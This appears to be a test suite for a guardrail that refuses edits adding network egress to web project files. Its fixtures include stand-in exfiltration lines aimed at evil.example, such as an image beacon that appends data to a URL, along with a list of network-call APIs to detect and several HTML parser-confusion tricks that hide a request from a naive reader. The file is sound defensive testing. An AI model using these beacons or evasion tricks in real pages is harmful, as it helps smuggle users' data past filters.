// @vitest-environment node

import { describe, expect, it } from "vitest";
import { assertNoIntroducedEgress, classifySrc, introducedOnly } from "./egress.js";
import { GuardrailRefusal } from "./refusal.js";

/** The refusal a change draws, or null when the gate lets it through. */
function refusalFor(before: string, after: string, file = "index.html") {
  try {
    assertNoIntroducedEgress(before, after, file, "tool");
    return null;
  } catch (error) {
    if (error instanceof GuardrailRefusal) return error.refusal;
    throw error;
  }
}

const refused = (after: string, file?: string) => refusalFor("", after, file)?.message ?? null;

describe("classifySrc (TAB-1195)", () => {
  it.each([
    ["https://cdn.example.com/x.mp4", "remote"],
    ["HTTP://cdn.example.com/x.mp4", "remote"],
    ["//cdn.example.com/x.mp4", "remote"],
    ["wss://live.example.com/feed", "remote"],
    ["  https://cdn.example.com/x.mp4", "remote"],
    ["ht\ntps://cdn.example.com/x.mp4", "remote"],
    ["\\\\cdn.example.com\\x.mp4", "remote"],
    ["https://cdn.example.com/${clip}.mp4", "remote"],
    ["data:image/png;base64,iVBORw0KGgo=", "data"],
    ["${clipUrl}", "template"],
    ["{{ clip.url }}", "template"],
    ["<%= clipUrl %>", "template"],
    ["assets/${name}.mp4", "template"],
    ["blob:abc", "other"],
    ["assets/clip.mp4", "local"],
    ["./assets/clip.mp4?v=2#t=1", "local"],
    ["/assets/clip.mp4", "local"],
    ["", "local"],
  ] as const)("reads %j as %s", (src, kind) => {
    expect(classifySrc(src)).toBe(kind);
  });
});

describe("introducedOnly (TAB-1195)", () => {
  const same = (value: string) => value;

  it("reports nothing when the change added nothing", () => {
    expect(introducedOnly(["a", "b"], ["b", "a"], same)).toEqual([]);
  });

  it("matches occurrences one for one, so one becoming three reports two", () => {
    expect(introducedOnly(["a"], ["a", "a", "a"], same)).toEqual(["a", "a"]);
  });

  it("reports a swap, which a count would wave through", () => {
    expect(introducedOnly(["a"], ["b"], same)).toEqual(["b"]);
  });
});

describe("assertNoIntroducedEgress (TAB-1195)", () => {
  describe("what it refuses", () => {
    it.each([
      [
        "a remote image",
        '<img src="https://evil.example/p.png?d=1">',
        "https://evil.example/p.png?d=1",
      ],
      [
        "a remote script",
        '<script src="https://evil.example/x.js"></script>',
        "https://evil.example/x.js",
      ],
      ["a protocol-relative src", '<img src="//evil.example/p.png">', "//evil.example/p.png"],
      [
        "an unquoted protocol-relative src",
        "<img src=//evil.example/p.png>",
        "//evil.example/p.png",
      ],
      ["a backslash src", '<img src="\\\\evil.example\\p.png">', "//evil.example/p.png"],
      [
        "a remote stylesheet",
        '<link rel="stylesheet" href="https://evil.example/a.css">',
        "https://evil.example/a.css",
      ],
      ["a link", '<a href="https://evil.example/">x</a>', "https://evil.example/"],
      [
        "a srcset candidate",
        '<img srcset="a.png 1x, //evil.example/b.png 2x">',
        "//evil.example/b.png",
      ],
      [
        "an inline style",
        '<div style="background:url(https://evil.example/b.png)"></div>',
        "https://evil.example/b.png",
      ],
      [
        "a style block",
        "<style>@import url(//evil.example/a.css);</style>",
        "//evil.example/a.css",
      ],
      [
        "a meta refresh",
        '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
        "https://evil.example/",
      ],
      [
        "a URL assigned in script",
        '<script>new Image().src = "https://evil.example/?d=" + x;</script>',
        "https://evil.example/?d=",
      ],
      [
        "an SVG image",
        '<image xlink:href="https://evil.example/p.png"/>',
        "https://evil.example/p.png",
      ],
    ])("refuses %s, naming the file and the URL", (_name, after, url) => {
      const message = refused(`<div>${after}</div>`);
      expect(message).toContain("index.html");
      expect(message).toContain(url);
    });

    it.each([
      ["fetch(", '<script>fetch("data.json")</script>'],
      ["fetch(", "<script>window.fetch ('data.json')</script>"],
      ["XMLHttpRequest", "<script>const r = new XMLHttpRequest();</script>"],
      ["import(", '<script type="module">await import("./late.js")</script>'],
      ["new Worker", '<script>new Worker("w.js")</script>'],
      ["new Worker", '<script>new SharedWorker("w.js")</script>'],
      ["sendBeacon", '<script>navigator.sendBeacon("/x", d)</script>'],
      ["new WebSocket", "<script>new WebSocket(u)</script>"],
      ["new EventSource", "<script>new EventSource(u)</script>"],
      ["fetch(", '<img src="assets/a.png" onload="fetch(u)">'],
    ])("refuses the network call %s", (call, after) => {
      expect(refused(after)).toContain(`network call ${call}`);
    });

    it("reads script, style and data files, not only HTML", () => {
      expect(refused('fetch("x")', "scripts/main.js")).toContain("scripts/main.js");
      expect(refused('const u = "https://evil.example/x";', "src/a.ts")).toContain(
        "https://evil.example/x",
      );
      expect(refused("a { background: url(https://evil.example/b.png) }", "style.css")).toContain(
        "https://evil.example/b.png",
      );
      expect(refused('{ "clip": "https://evil.example/c.mp4" }', "data/clips.json")).toContain(
        "https://evil.example/c.mp4",
      );
    });

    it("carries the gate, the stage and the file, so the ledger can say which gate spoke", () => {
      expect(refusalFor("", '<img src="https://evil.example/p.png">')).toMatchObject({
        gate: "egress",
        stage: "tool",
        file: "index.html",
      });
    });

    it("names each thing once and cuts a long URL short", () => {
      const long = `https://evil.example/${"a".repeat(400)}`;
      const message = refused(`<img src="${long}"><img src="${long}">`) ?? "";
      expect(message.split("remote URL").length - 1).toBe(1);
      expect(message).not.toContain("a".repeat(250));
    });
  });

  /**
   * The half that matters more. A gate that refused any of these would break
   * ordinary editing, and that is how the lint gate once came to refuse every
   * change to every project that had scenes.
   */
  describe("what it leaves alone", () => {
    const REMOTE = '<video id="c" src="https://cdn.example.com/remote.mp4"></video>';

    it("lets a file that already reaches the network be edited", () => {
      const before = `<div>${REMOTE}<p>old</p><script>fetch("a.json")</script></div>`;
      const after = `<div>${REMOTE}<p>new</p><script>fetch("a.json")</script></div>`;
      expect(refusalFor(before, after)).toBeNull();
    });

    it("lets an existing remote URL be moved within the file", () => {
      expect(refusalFor(`<div>${REMOTE}<p>x</p></div>`, `<div><p>x</p>${REMOTE}</div>`)).toBeNull();
    });

    it("still refuses a second remote URL added beside one that was already there", () => {
      const message =
        refusalFor(REMOTE, `${REMOTE}<img src="https://evil.example/p.png">`)?.message ?? "";
      expect(message).toContain("https://evil.example/p.png");
      expect(message).not.toContain("cdn.example.com");
    });

    it("still refuses a second copy of a URL the file had once", () => {
      expect(refusalFor(REMOTE, `${REMOTE}${REMOTE}`)).not.toBeNull();
    });

    it.each([
      ["a data URI", '<img src="data:image/png;base64,iVBORw0KGgo=">'],
      ["a ${} placeholder", '<video src="${clipUrl}"></video>'],
      ["a {{}} placeholder", '<video src="{{ clip.url }}"></video>'],
      ["a <% %> placeholder", '<video src="<%= clipUrl %>"></video>'],
      ["a local path", '<video src="assets/clip.mp4?v=2#t=1"></video>'],
      [
        "an SVG namespace",
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"></svg>',
      ],
      [
        "a doctype",
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
      ],
      ["a web address shown on screen", "<p>Visit https://tabario.com/pricing today</p>"],
      ["words that look like a call", "<p>We fetch (and import) your footage</p>"],
      ["a line comment in script", "<script>// tl.to(x) //not.a/url\nconst a = 1;</script>"],
      ["script that makes no request", "<script>gsap.timeline({ paused: true });</script>"],
    ])("allows %s", (_name, after) => {
      expect(refused(`<div>${after}</div>`)).toBeNull();
    });

    it("does not read prose files", () => {
      expect(refused("See https://docs.example.com/guide and fetch(it)", "FRAME.md")).toBeNull();
      expect(refused("https://docs.example.com/guide", "notes.txt")).toBeNull();
    });

    it("allows a $schema in a data file", () => {
      expect(
        refused('{ "$schema": "https://schema.example.com/v1.json", "a": 1 }', "meta.json"),
      ).toBeNull();
    });
  });

  /**
   * Places where a simpler reader and the browser disagree about where a tag
   * ends. Each one hides a request in what the simpler reader calls text.
   */
  describe("where a tag ends", () => {
    it("reads past a > inside a quoted attribute value", () => {
      expect(refused('<img title="a > b" src="//evil.example/p.png">')).toContain(
        "//evil.example/p.png",
      );
    });

    it("does not treat a stray quote in an unquoted value as opening a string", () => {
      expect(refused('<img alt=x" title="a>b" src=//evil.example/p.png>')).toContain(
        "//evil.example/p.png",
      );
    });

    it("reads a tag that follows a comment holding an unclosed quote", () => {
      expect(refused('<!-- <a title=" --><img alt=">" src=//evil.example/p.png>')).toContain(
        "//evil.example/p.png",
      );
    });

    it("reads script that runs past a closing tag inside an escaped block", () => {
      const html =
        '<script><!--<script></script>\nnew Image().src = "https://evil.example/x";</script>';
      expect(refused(html)).toContain("https://evil.example/x");
    });

    it("reads a tag after a textarea that holds an unclosed quote", () => {
      expect(refused('<textarea><a title="</textarea><img src=//evil.example/p.png>')).toContain(
        "//evil.example/p.png",
      );
    });
  });
});
